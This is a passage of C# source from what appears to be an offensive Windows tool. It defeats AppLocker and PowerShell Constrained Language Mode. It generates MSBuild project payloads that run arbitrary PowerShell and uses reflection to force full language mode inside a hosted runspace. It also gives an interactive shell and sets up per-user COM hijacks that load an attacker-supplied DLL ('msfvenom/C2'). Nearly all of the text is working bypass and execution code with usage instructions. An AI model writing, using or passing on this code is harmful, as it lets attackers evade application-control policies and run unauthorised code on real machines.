        // -------------------------------------------------------------------------

        static void GenerateMSBuildPayload(string outputPath, string command)
        {
            // command is guaranteed non-empty by the caller (prompted interactively if not passed)
            // Escape the command for embedding inside a C# double-quoted string literal.
            // The resulting text goes inside  AddScript("...here...")  in the payload.
            string escapedCmd = command
                .Replace("\\", "\\\\")
                .Replace("\"", "\\\"")
                .Replace("\r", "")
                .Replace("\n", "; ");

            string fileName = Path.GetFileName(outputPath);

            // Build the payload C# code using a StringBuilder so we never have to worry
            // about nested verbatim-string quoting interactions with the outer C# file.
            var code = new StringBuilder();
            code.AppendLine("using Microsoft.Build.Utilities;");
            code.AppendLine("using System;");
            code.AppendLine("using System.Collections.ObjectModel;");
            code.AppendLine("using System.Management.Automation;");
            code.AppendLine("using System.Management.Automation.Runspaces;");
            code.AppendLine("using System.Reflection;");
            code.AppendLine();
            code.AppendLine("public class AppLockerBypass : Task");
            code.AppendLine("{");
            code.AppendLine("    public override bool Execute()");
            code.AppendLine("    {");
            code.AppendLine("        try");
            code.AppendLine("        {");
            code.AppendLine("            var iss = InitialSessionState.CreateDefault();");
            code.AppendLine("            iss.LanguageMode = PSLanguageMode.FullLanguage;");
            code.AppendLine("            using (var rs = RunspaceFactory.CreateRunspace(iss))");
            code.AppendLine("            {");
            code.AppendLine("                rs.Open();");
            code.AppendLine("                ForceFullLanguage(rs);");
            code.AppendLine("                try {");
            code.AppendLine("                    using (var init = rs.CreatePipeline()) {");
            code.AppendLine("                        init.Commands.AddScript(");
            code.AppendLine("                            \"Set-ExecutionPolicy Bypass -Scope Process -Force -EA SilentlyContinue\");");
            code.AppendLine("                        init.Invoke();");
            code.AppendLine("                    }");
            code.AppendLine("                } catch {}");
            code.AppendLine("                using (var pipe = rs.CreatePipeline())");
            code.AppendLine("                {");
            code.AppendLine("                    pipe.Commands.AddScript(\"" + escapedCmd + "\");");
            code.AppendLine("                    pipe.Commands.Add(\"Out-String\");");
            code.AppendLine("                    var results = pipe.Invoke();");
            code.AppendLine("                    foreach (var r in results)");
            code.AppendLine("                        Log.LogMessage(Microsoft.Build.Framework.MessageImportance.High, r.ToString());");
            code.AppendLine("                    if (pipe.Error.Count > 0)");
            code.AppendLine("                        foreach (var e in pipe.Error.ReadToEnd())");
            code.AppendLine("                            Log.LogWarning(e.ToString());");
            code.AppendLine("                }");
            code.AppendLine("            }");
            code.AppendLine("        }");
            code.AppendLine("        catch (Exception ex) { Log.LogError(\"Error: \" + ex.Message); }");
            code.AppendLine("        return true;");
            code.AppendLine("    }");
            code.AppendLine();
            // Reflection helper — forces FullLanguage on ExecutionContext._languageMode
            code.AppendLine("    static void ForceFullLanguage(Runspace rs)");
            code.AppendLine("    {");
            code.AppendLine("        try");
            code.AppendLine("        {");
            code.AppendLine("            var bf = BindingFlags.NonPublic | BindingFlags.Instance;");
            code.AppendLine("            var t = rs.GetType();");
            code.AppendLine("            while (t != null)");
            code.AppendLine("            {");
            code.AppendLine("                foreach (var fi in t.GetFields(bf))");
            code.AppendLine("                {");
            code.AppendLine("                    try");
            code.AppendLine("                    {");
            code.AppendLine("                        var val = fi.GetValue(rs);");
            code.AppendLine("                        if (val == null) continue;");
            code.AppendLine("                        if (val.GetType().Name == \"ExecutionContext\")");
            code.AppendLine("                        {");
            code.AppendLine("                            var lmf = val.GetType().GetField(\"_languageMode\", bf);");
            code.AppendLine("                            if (lmf != null) { lmf.SetValue(val, PSLanguageMode.FullLanguage); return; }");
            code.AppendLine("                            var lmp = val.GetType().GetProperty(\"LanguageMode\",");
            code.AppendLine("                                BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance);");
            code.AppendLine("                            if (lmp != null && lmp.CanWrite) { lmp.SetValue(val, PSLanguageMode.FullLanguage, null); return; }");
            code.AppendLine("                        }");
            code.AppendLine("                    } catch {}");
            code.AppendLine("                }");
            code.AppendLine("                t = t.BaseType;");
            code.AppendLine("            }");
            code.AppendLine("        } catch {}");
            code.AppendLine("    }");
            code.AppendLine("}");

            // Build the complete .csproj XML
            var xml = new StringBuilder();
            xml.AppendLine("<?xml version=\"1.0\" encoding=\"utf-8\"?>");
            xml.AppendLine("<!--");
            xml.AppendLine("  AppLocker Bypass via MSBuild CodeTaskFactory");
            xml.AppendLine("  ============================================");
            xml.AppendLine("  MSBuild.exe lives in %WINDIR%\\Microsoft.NET\\Framework[64]\\v4.0.30319\\");
            xml.AppendLine("  and is allowed by the default AppLocker publisher rules.");
            xml.AppendLine();
            xml.AppendLine("  Usage:");
            xml.AppendLine("    C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe " + fileName + " /t:Execute");
            xml.AppendLine("    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe " + fileName + " /t:Execute");
            xml.AppendLine("-->");
            xml.AppendLine("<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">");
            xml.AppendLine();
            xml.AppendLine("  <Target Name=\"Execute\">");
            xml.AppendLine("    <AppLockerBypass />");
            xml.AppendLine("  </Target>");
            xml.AppendLine();
            xml.AppendLine("  <UsingTask");
            xml.AppendLine("    TaskName=\"AppLockerBypass\"");
            xml.AppendLine("    TaskFactory=\"CodeTaskFactory\"");
            xml.AppendLine("    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\">");
            xml.AppendLine("    <Task>");
            xml.AppendLine("      <Reference Include=\"System.Management.Automation\" />");
            xml.AppendLine("      <Code Type=\"Class\" Language=\"cs\">");
            xml.AppendLine("        <![CDATA[");
            xml.Append(code.ToString());
            xml.AppendLine("        ]]>");
            xml.AppendLine("      </Code>");
            xml.AppendLine("    </Task>");
            xml.AppendLine("  </UsingTask>");
            xml.AppendLine();
            xml.AppendLine("</Project>");

            try
            {
                File.WriteAllText(outputPath, xml.ToString());
                Good("MSBuild payload written: " + outputPath);
                Line();
                Good("Execute (x86): C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe "
                     + outputPath + " /t:Execute");
                Good("Execute (x64): C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe "
                     + outputPath + " /t:Execute");
                Line();
                Info("Embedded command: " + command);
            }
            catch (Exception ex)
            {
                Err("Failed to write payload: " + ex.Message);
            }
        }

        // -------------------------------------------------------------------------
        // PowerShell Execution — CLM Bypass via In-Process Runspace Hosting
        //
        // Key technique: we are a .NET executable, not powershell.exe.
        // AppLocker's CLM enforcement targets the powershell.exe host process.
        // By hosting the PS runtime ourselves and setting LanguageMode = FullLanguage
        // at the InitialSessionState level, plus patching ExecutionContext._languageMode
        // via reflection, we execute arbitrary PS in Full Language Mode regardless of
        // what AppLocker or SRP policies are configured on this machine.
        // -------------------------------------------------------------------------

        static void InitRunspace()
        {
            if (_runspace != null && _runspace.RunspaceStateInfo.State == RunspaceState.Opened)
                return;

            CleanupRunspace();

            // Step 1: Set LanguageMode = FullLanguage in InitialSessionState
            var iss = InitialSessionState.CreateDefault();
            iss.LanguageMode = PSLanguageMode.FullLanguage;

            _runspace = RunspaceFactory.CreateRunspace(iss);
            _runspace.Open();

            // Step 2: Force FullLanguage via reflection on ExecutionContext._languageMode
            // This handles environments where PS re-applies CLM after runspace open
            ForceFullLanguageMode(_runspace);

            // Step 3: Bypass execution policy for this process
            try
            {
                using (var pipe = _runspace.CreatePipeline())
                {
                    pipe.Commands.AddScript(
                        "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force " +
                        "-ErrorAction SilentlyContinue");
                    pipe.Invoke();
                }
            }
            catch { }
        }

        static void ForceFullLanguageMode(Runspace rs)
        {
            // Walk the inheritance chain of the concrete Runspace type (LocalRunspace)
            // looking for a field that holds an instance of ExecutionContext (internal type).
            // When found, set its _languageMode field to FullLanguage.
            try
            {
                var bf = BindingFlags.NonPublic | BindingFlags.Instance;
                var t = rs.GetType();

                while (t != null)
                {
                    foreach (var fi in t.GetFields(bf))
                    {
                        try
                        {
                            var val = fi.GetValue(rs);
                            if (val == null) continue;

                            if (val.GetType().Name == "ExecutionContext")
                            {
                                // Try direct field first
                                var lmField = val.GetType().GetField("_languageMode", bf);
                                if (lmField != null)
                                {
                                    lmField.SetValue(val, PSLanguageMode.FullLanguage);
                                    return;
                                }

                                // Fallback: try property
                                var lmProp = val.GetType().GetProperty("LanguageMode",
                                    bf | BindingFlags.Public);
                                if (lmProp != null && lmProp.CanWrite)
                                {
                                    lmProp.SetValue(val, PSLanguageMode.FullLanguage, null);
                                    return;
                                }
                            }
                        }
                        catch { }
                    }
                    t = t.BaseType;
                }
            }
            catch { }
        }

        static void RunCommand(string command)
        {
            try
            {
                InitRunspace();
                Info("Executing in Full Language Mode runspace...\n");

                using (var pipe = _runspace.CreatePipeline())
                {
                    pipe.Commands.AddScript(command);
                    pipe.Commands.Add("Out-String");

                    var results = pipe.Invoke();
                    var sb = new StringBuilder();
                    foreach (var r in results) sb.Append(r.ToString());
                    Console.Write(sb.ToString());

                    if (pipe.Error.Count > 0)
                    {
                        Err("Errors:");
                        foreach (var e in pipe.Error.ReadToEnd())
                            Console.WriteLine("  " + e);
                    }
                }
            }
            catch (Exception ex)
            {
                Err("Execution failed: " + ex.Message);
            }
        }

        static void RunScript(string path)
        {
            if (!File.Exists(path)) { Err("File not found: " + path); return; }
            try { RunCommand(File.ReadAllText(path)); }
            catch (Exception ex) { Err("Error reading script: " + ex.Message); }
        }

        static void RunShell()
        {
            try
            {
                InitRunspace();

                // Verify the language mode we got
                string mode = "Unknown";
                using (var pipe = _runspace.CreatePipeline())
                {
                    pipe.Commands.AddScript("$ExecutionContext.SessionState.LanguageMode");
                    var res = pipe.Invoke();
                    if (res.Count > 0) mode = res[0].ToString();
                }

                if (mode == "FullLanguage")
                    Good("CLM bypass active — Language mode: FullLanguage");
                else
                    Warn("Language mode: " + mode + " (bypass may be partial on this system)");

                Good("Interactive shell started. Type 'exit' or press Ctrl+C to quit.\n");

                while (true)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("PS[Full]> ");
                    Console.ResetColor();

                    string input = Console.ReadLine();
                    if (input == null || input.Trim().Equals("exit", StringComparison.OrdinalIgnoreCase))
                        break;
                    if (string.IsNullOrWhiteSpace(input))
                        continue;

                    RunCommand(input);
                }
            }
            catch (Exception ex)
            {
                Err("Shell error: " + ex.Message);
            }
        }

        // -------------------------------------------------------------------------
        // COM Hijack Bypass
        //
        // Why it works:
        //   - Registration in HKCU\Software\Classes\CLSID requires NO admin rights.
        //   - "New-Object -ComObject" is on the CLM safe-cmdlet whitelist — allowed
        //     in ConstrainedLanguage mode.
        //   - When CoCreateInstance loads the InprocServer32 DLL into powershell.exe,
        //     DllMain(DLL_PROCESS_ATTACH) runs arbitrary code inside the trusted process.
        //   - AppLocker DLL rules are disabled by default (performance cost means they
        //     are rarely deployed), so the DLL itself is not blocked.
        // -------------------------------------------------------------------------

        static void CheckComHijackAvailability()
        {
            // New-Object -ComObject is always available in CLM — it's whitelisted
            Good("New-Object -ComObject is allowed in CLM (whitelisted cmdlet)");

            // HKCU\Software\Classes is always writable — no admin required
            Good("HKCU\\Software\\Classes is writable (no admin required)");

            // Check if AppLocker DLL rules are active
            var policy = ReadAppLockerRegistry();
            bool dllRulesActive = policy.HasPolicy &&
                                  policy.Rules.Any(r => r.Collection == "Dll" && r.Enforced);
            if (dllRulesActive)
                Warn("AppLocker DLL rules ARE enabled — DLL may be blocked depending on path");
            else
                Good("AppLocker DLL rules NOT active — DLL will load unrestricted");

            Info("Bring your own DLL (msfvenom/C2), then: comsetup <dll> [ProgID]");
        }

        static void SetupComHijack(string dllPath, string progId)
        {
            string guid = "{" + Guid.NewGuid().ToString() + "}";

            if (string.IsNullOrEmpty(progId))
                progId = "AppLocker.Bypass." + Guid.NewGuid().ToString("N").Substring(0, 8);

            // HKCU\Software\Classes\CLSID\{GUID}
            string clsidBase = @"Software\Classes\CLSID\" + guid;
            try
            {
                using (var k = Registry.CurrentUser.CreateSubKey(clsidBase))
                    k.SetValue("", "COM Hijack");

                // HKCU\Software\Classes\CLSID\{GUID}\InprocServer32
                using (var k = Registry.CurrentUser.CreateSubKey(clsidBase + @"\InprocServer32"))
                {
                    k.SetValue("", dllPath);
                    k.SetValue("ThreadingModel", "Both");
                }

                // HKCU\Software\Classes\{ProgID}
                using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\" + progId))
                    k.SetValue("", "COM Hijack");

                // HKCU\Software\Classes\{ProgID}\CLSID
                using (var k = Registry.CurrentUser.CreateSubKey(@"Software\Classes\" + progId + @"\CLSID"))
                    k.SetValue("", guid);

                Good("COM hijack registered in HKCU (no admin required):");
                Good("  GUID:   " + guid);
                Good("  DLL:    " + dllPath);
                Good("  ProgID: " + progId);
                Line();

                bool dllExists = File.Exists(dllPath);
                if (dllExists)
                    Good("DLL exists at path — ready to load");
                else
                    Warn("DLL not found at path — compile first, then comload");

                Line();
                Info("Trigger payload with:");
                Good("  AppLockerCLM.exe comload " + progId);
                Info("  or in any PowerShell (works in CLM):");
                Good("  New-Object -ComObject " + progId);
                Line();
                Info("Clean up:");
                Good("  AppLockerCLM.exe comclean " + guid);
                Good("  AppLockerCLM.exe comclean " + progId);
            }
            catch (Exception ex)
            {
                Err("COM registration failed: " + ex.Message);
            }
        }

        static void LoadComObject(string progIdOrGuid)
        {
            Info("Loading COM object: " + progIdOrGuid);
            Info("(New-Object -ComObject is CLM-safe — DllMain fires on CoCreateInstance)");
            Line();

            InitRunspace();

            // Build the load expression.
            // Both forms work in CLM:
            //   New-Object -ComObject ProgID            (ProgID lookup -> CLSID -> InprocServer32)
            //   [Activator]::CreateInstance(...)        (direct CLSID, but [Activator] may be blocked in CLM)
            // New-Object -ComObject is the safest for CLM.
            string script;
            bool isGuid = progIdOrGuid.StartsWith("{") ||
                          (progIdOrGuid.Length == 36 && progIdOrGuid.Contains("-"));

            if (isGuid)
            {
                // Use Activator for GUID-only (no ProgID registered)
                // This may not work in CLM — prefer registering a ProgID with comsetup
                string rawGuid = progIdOrGuid.Trim('{', '}');
                script = "[activator]::CreateInstance([type]::GetTypeFromCLSID([System.Guid]\"" + rawGuid + "\"))";
                Warn("Using Activator::CreateInstance — may be restricted in CLM.");
                Info("Register a ProgID with 'comsetup' and use that instead for CLM.");
            }
            else
            {
                // New-Object -ComObject is whitelisted in CLM
                script = "$null = New-Object -ComObject " + progIdOrGuid +
                         " -ErrorAction SilentlyContinue; 'Loaded'";
            }

            try
            {
                using (var pipe = _runspace.CreatePipeline())
                {
                    pipe.Commands.AddScript(script);
                    var results = pipe.Invoke();

                    if (pipe.Error.Count > 0)
                    {
                        // Errors here are normal — the DLL may not implement IDispatch,
                        // but DllMain still fired on DLL_PROCESS_ATTACH
                        foreach (var e in pipe.Error.ReadToEnd())
                            Info("COM error (expected if DLL has no dispatch interface): " + e);
                    }

                    Good("COM load triggered — DllMain(DLL_PROCESS_ATTACH) executed");
                    Info("Check your payload's output (e.g. %TEMP%\\out.txt if redirected)");
                }
            }
            catch (Exception ex)
            {
                // Exception from COM instantiation is expected if the DLL doesn't
                // implement a proper COM interface — the payload in DllMain already ran
                Info("COM exception (payload likely ran): " + ex.Message);
                Good("DllMain(DLL_PROCESS_ATTACH) fires before COM interface is checked");
            }
        }

        static void CleanComHijack(string guidOrProgId)
        {
            int removed = 0;

            // Try as CLSID GUID
            if (guidOrProgId.StartsWith("{") || CouldBeGuid(guidOrProgId))
            {
                string guid = guidOrProgId.StartsWith("{")
                    ? guidOrProgId
                    : "{" + guidOrProgId + "}";

                string clsidPath = @"Software\Classes\CLSID\" + guid;
                try
                {
                    Registry.CurrentUser.DeleteSubKeyTree(clsidPath);
                    Good("Removed: HKCU\\" + clsidPath);
                    removed++;
                }
                catch { }
            }

            // Try as ProgID
            string progIdPath = @"Software\Classes\" + guidOrProgId;
            try
            {
                using (var k = Registry.CurrentUser.OpenSubKey(progIdPath))
                {
                    if (k != null)
                    {
                        Registry.CurrentUser.DeleteSubKeyTree(progIdPath);
                        Good("Removed: HKCU\\" + progIdPath);
                        removed++;
                    }
                }
            }
            catch { }

            if (removed == 0)
                Warn("No matching COM hijack entries found for: " + guidOrProgId);
            else
                Good(removed + " registry key(s) removed");
        }

        static void ListComHijacks()
        {
            Info("Scanning HKCU\\Software\\Classes\\CLSID for COM registrations...\n");

            int found = 0;
            try
            {
                using (var clsidBase = Registry.CurrentUser.OpenSubKey(@"Software\Classes\CLSID"))
                {
                    if (clsidBase == null) { Info("No CLSID registrations in HKCU"); return; }

                    foreach (string guidKey in clsidBase.GetSubKeyNames())
                    {
                        try
                        {
                            using (var inproc = clsidBase.OpenSubKey(guidKey + @"\InprocServer32"))
                            {
                                if (inproc == null) continue;

                                string dllPath  = inproc.GetValue("") as string ?? "(not set)";
                                string threading = inproc.GetValue("ThreadingModel") as string ?? "(not set)";
                                string progId   = FindProgIdForClsid(guidKey);

                                Good(guidKey);
                                Info("  DLL:        " + dllPath);
                                Info("  Threading:  " + threading);
                                Info("  ProgID:     " + (string.IsNullOrEmpty(progId) ? "(none)" : progId));
                                Info("  DLL exists: " + (File.Exists(dllPath) ? "YES" : "NO"));
                                Line();
                                found++;
                            }
                        }
                        catch { }
                    }
                }
            }
            catch (Exception ex) { Err("Enumeration failed: " + ex.Message); }

            if (found == 0)
                Info("No InprocServer32 registrations found in HKCU");
            else
                Good(found + " registration(s) found — use 'comclean <GUID>' to remove");
        }

        static string FindProgIdForClsid(string guid)
        {
            // Reverse-lookup: scan HKCU\Software\Classes\{ProgID}\CLSID for matching GUID
            try
            {
                using (var classesKey = Registry.CurrentUser.OpenSubKey(@"Software\Classes"))
                {
                    if (classesKey == null) return null;
                    foreach (string name in classesKey.GetSubKeyNames())
                    {
                        if (name.StartsWith("{")) continue;
                        try
                        {
                            using (var clsidSub = classesKey.OpenSubKey(name + @"\CLSID"))
                            {
                                if (clsidSub == null) continue;
                                string val = clsidSub.GetValue("") as string ?? "";
                                if (val.Equals(guid, StringComparison.OrdinalIgnoreCase))
                                    return name;
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
            return null;
        }

        static bool CouldBeGuid(string s)
        {
            Guid g;
            return Guid.TryParse(s, out g);
        }

        // -------------------------------------------------------------------------
        // Utilities
        // -------------------------------------------------------------------------

        static bool IsAppLockerServiceRunning()
        {
            try
            {
                using (var sc = new ServiceController("AppIDSvc"))
                    return sc.Status == ServiceControllerStatus.Running;
            }
            catch { return false; }
        }

        static void CleanupRunspace()
        {
            if (_runspace == null) return;
            try
            {
                if (_runspace.RunspaceStateInfo.State == RunspaceState.Opened)
                    _runspace.Close();
                _runspace.Dispose();
            }
            catch { }
            _runspace = null;
        }

        static string TruncStr(string s, int len)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Length <= len ? s : s.Substring(0, len - 1) + "…";
        }
    }

    // -------------------------------------------------------------------------
    // Data Models
    // -------------------------------------------------------------------------

    class AppLockerPolicy
    {
        public bool HasPolicy { get; set; }
        public List<AppLockerRule> Rules { get; } = new List<AppLockerRule>();
    }

    class AppLockerRule
    {
        public string Collection { get; set; }  // Exe | Script | Dll | Msi | Appx
        public string RuleType   { get; set; }  // FilePathRule | FilePublisherRule | FileHashRule
        public string Id         { get; set; }
        public string Name       { get; set; }
        public string Action     { get; set; }  // Allow | Deny
        public string UserSid    { get; set; }
        public bool   Enforced   { get; set; }
        public List<string> Paths { get; } = new List<string>();
        public string Publisher  { get; set; }
        public string Product    { get; set; }
    }
}
